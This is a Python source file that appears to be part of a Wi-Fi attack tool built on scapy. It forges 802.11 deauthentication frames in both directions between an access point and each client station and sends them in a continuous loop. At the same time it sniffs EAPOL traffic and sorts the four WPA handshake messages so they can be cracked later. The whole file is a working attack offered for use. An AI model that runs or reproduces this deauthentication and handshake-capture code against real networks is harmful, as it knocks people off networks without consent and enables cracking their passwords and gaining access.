import os
import re
import sys
import time
import curses
import random
import binascii
import threading
import subprocess
from pull import PULL
from scapy.sendrecv import sniff
from scapy.sendrecv import sendp
from scapy.packet   import Raw
from scapy.layers.dot11 import RadioTap
from scapy.layers.dot11 import Dot11Deauth
from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import Dot11Beacon
from scapy.layers.dot11 import Dot11Elt
from scapy.layers.dot11 import Dot11EltRSN
from scapy.layers.dot11 import Dot11FCS
from scapy.layers.dot11 import Dot11EltMicrosoftWPA
from scapy.layers.dot11 import Dot11EltCountry
from scapy.layers.eap   import EAPOL

pull = PULL()

class CAPTURE:

	FNONCE = "0000000000000000000000000000000000000000000000000000000000000000"
	FMIC   = "00000000000000000000000000000000"

	JAMMERRUN = True
	JAMMERSTA = True

	__CRATE   = {}

	def __init__(self, iface, bssid, essid, channel, power, device, encryption, cipher, auth, stations):
		self.interface = iface
		self.bssid = bssid
		self.essid = essid
		self.channel = channel
		self.power   = power
		self.device  = device
		self.encryption = encryption
		self.cipher  = cipher
		self.auth    = auth
		self.stations = stations

	def channeler(self):
		ch = str(self.channel)
		subprocess.call(['iwconfig', self.interface, 'channel', ch])

	def extract_sn_rc(self, pkt):
		try:
			sn = pkt.getlayer(Dot11FCS).addr2
			rc = pkt.getlayer(Dot11FCS).addr1
		except:
			sn = pkt.getlayer(Dot11).addr2
			rc = pkt.getlayer(Dot11).addr1

		return (sn, rc)

	def extract_ds(self, pkt):
		try:
			tds = pkt.getlayer(Dot11FCS).FCfield & 0x1 !=0
			fds = pkt.getlayer(Dot11FCS).FCfield & 0x2 !=0
		except:
			tds = pkt.getlayer(Dot11).FCfield & 0x1 !=0
			fds = pkt.getlayer(Dot11).FCfield & 0x2 !=0

		return (tds, fds)

	def forge(self, ap, sta):
		def fpkt(sn, rc):
			pkt = RadioTap() / Dot11(
						type=0,
						subtype=12,
						addr1=rc,
						addr2=sn,
						addr3=sn
					) / Dot11Deauth(
						reason=7
					)

			return pkt

		retval = []

		retval.append(fpkt(ap, sta))
		retval.append(fpkt(sta, ap))

		return retval

	def forgerer(self):
		retval = []

		for sta in self.stations:
			pkts = self.forge(self.bssid, sta)
			toappend = {
				'ap': self.bssid,
				'sta': sta,
				'pkts': pkts
			}
			retval.append(toappend)

		return retval

	def send(self, pkt):
		sendp(
			pkt,
			iface=self.interface,
			count=25,
			inter=0.01,
			verbose=False
		)

	def jammer(self):
		tgts = self.forgerer()

		while self.JAMMERRUN:
			for target in tgts:
				ap = target.get('ap')
				sta = target.get('sta')
				pkts = target.get('pkts')

				for pkt in pkts:
					self.send(pkt)

				if self.JAMMERRUN:
					pull.print(
						"-",
						"Deauth Sent. CODE [{code}] {ap} <--> {sta} ({essid})".format(
							code=7,
							ap=ap,
							sta=sta,
							essid=self.essid,
						),
						"\r", pull.RED
					)

		self.JAMMERSTA = False

	def capture(self, pkt):
		if pkt.haslayer(EAPOL):
			rtval = self.extract_sn_rc(pkt)
			sn = rtval[0]
			rc = rtval[1]

			rtval = self.extract_ds(pkt)
			tds   = rtval[0]
			fds   = rtval[1]

			if sn == self.bssid:
				tgt = rc
			elif rc == self.bssid:
				tgt = sn
			else:
				return

			if tgt not in list(self.__CRATE.keys()):
				self.__CRATE[ tgt ] = {}
				self.__CRATE[ tgt ][ 1 ] = None
				self.__CRATE[ tgt ][ 2 ] = None
				self.__CRATE[ tgt ][ 3 ] = None
				self.__CRATE[ tgt ][ 4 ] = None
			
			if fds == True:
				nonce = binascii.hexlify(pkt.getlayer(Raw).load)[26:90]
				mic   = binascii.hexlify(pkt.getlayer(Raw).load)[154:186]
				if sn == self.bssid and nonce != self.FNONCE and mic == self.FMIC:
					self.__CRATE[ tgt ][ 1 ] = pkt
					print("Captured")
				elif sn == self.bssid and nonce != self.FNONCE and mic != self.FMIC:
					self.__CRATE[ tgt ][ 3 ] = pkt
			elif tds == True:
				nonce = binascii.hexlify(pkt.getlayer(Raw).load)[26:90]
				mic   = binascii.hexlify(pkt.getlayer(Raw).load)[154:186]
				if rc == self.bssid and nonce != self.FNONCE and mic != self.FMIC:
					self.__CRATE[ tgt ][ 2 ] = pkt
				elif rc == self.bssid and nonce == self.FNONCE and mic != self.FMIC:
					self.__CRATE[ tgt ][ 4 ] = pkt

	def crater(self):
		for sta in self.stations:
			self.__CRATE[ sta ] = {}
			self.__CRATE[ sta ][ 1 ] = None
			self.__CRATE[ sta ][ 2 ] = None
			self.__CRATE[ sta ][ 3 ] = None
			self.__CRATE[ sta ][ 4 ] = None

	def engage(self):
		t = threading.Thread(target=self.jammer)
		t.daemon = True
		t.start()

		sniff(iface=self.interface, prn=self.capture)

		self.JAMMERRUN = False

		pull.print(
			"^",
			"Received Interrupt! Stopping Jammer!",
			"\r", pull.DARKCYAN
		)

		while self.JAMMERSTA:
			pass